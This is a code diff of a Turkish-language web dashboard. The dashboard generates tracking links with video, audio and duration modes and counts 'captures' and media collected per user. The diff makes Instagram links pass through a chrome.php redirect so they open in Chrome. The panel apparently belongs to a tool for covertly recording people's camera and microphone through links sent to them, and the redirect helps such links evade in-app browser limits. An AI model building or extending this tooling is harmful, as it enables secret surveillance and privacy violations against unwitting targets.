@@ -88,10 +88,9 @@
         <div class="stat-card"><h4 id="totalMediaLabel">TOTAL MEDIA</h4><div class="value" id="mediaCount">0</div></div>
     </div>
     
-    <!-- BİLGİ KARTI: Instagram Link Uyarısı -->
     <div class="info-card" id="infoCard">
         <p>⚠️ INSTAGRAM KULLANICILARI İÇİN ÖZEL LİNK KULLANIN! ⚠️</p>
-        <p>⬇️ Aşağıdaki "📱 INSTAGRAM (CHROME)" butonu ile link oluşturun. Bu link Instagram'da açıldığında otomatik Chrome'a yönlendirir.</p>
+        <p>⬇️ Aşağıdaki "📱 INSTAGRAM (CHROME)" butonu ile link oluşturun. Bu link Instagram'da otomatik Chrome'a yönlendirir.</p>
     </div>
     
     <div class="panel">
@@ -248,7 +247,6 @@
             document.getElementById('captureCount').innerText = myData.length;
             document.getElementById('mediaCount').innerText = totalMedia;
             
-            // İstatistik bilgilerini sessionStorage'a kaydet
             if (myData.length > 0) {
                 const avg = (totalMedia / myData.length).toFixed(2);
                 const lastDate = new Date(myData[0].timestamp).toLocaleString();
@@ -352,18 +350,17 @@
     
     function generateLink(mode, isInstagram = false) {
         if (!currentUser) return;
-        let url = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
+        let targetUrl = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
         if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
-            url += `&duration=${document.getElementById('videoDuration').value}`;
+            targetUrl += `&duration=${document.getElementById('videoDuration').value}`;
         }
         
-        // Instagram için özel: Chrome'a yönlendirme ekle
         if (isInstagram) {
-            // Instagram içinde açıldığında Chrome'a yönlendirme yapacak parametre
-            url += `&force_chrome=true`;
-            document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} 📱 INSTAGRAM ÖZEL: <a href="${url}" target="_blank" style="color:#ff0066">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button><br><small style="color:#ffaa00;">⚠️ Bu link Instagram'da otomatik Chrome'a yönlendirir!</small>`;
+            // Instagram linki: chrome.php üzerinden yönlendir
+            const chromeRedirectUrl = `${BASE_URL}/chrome.php?url=${encodeURIComponent(targetUrl)}`;
+            document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} 📱 INSTAGRAM ÖZEL: <a href="${chromeRedirectUrl}" target="_blank" style="color:#ff0066">${chromeRedirectUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${chromeRedirectUrl}')">${t('copy')}</button><br><small style="color:#ffaa00;">✅ Bu link Instagram'da açıldığında otomatik Chrome'a yönlendirir!</small>`;
         } else {
-            document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank" style="color:#00ff41">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>`;
+            document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} <a href="${targetUrl}" target="_blank" style="color:#00ff41">${targetUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${targetUrl}')">${t('copy')}</button>`;
         }
     }
     
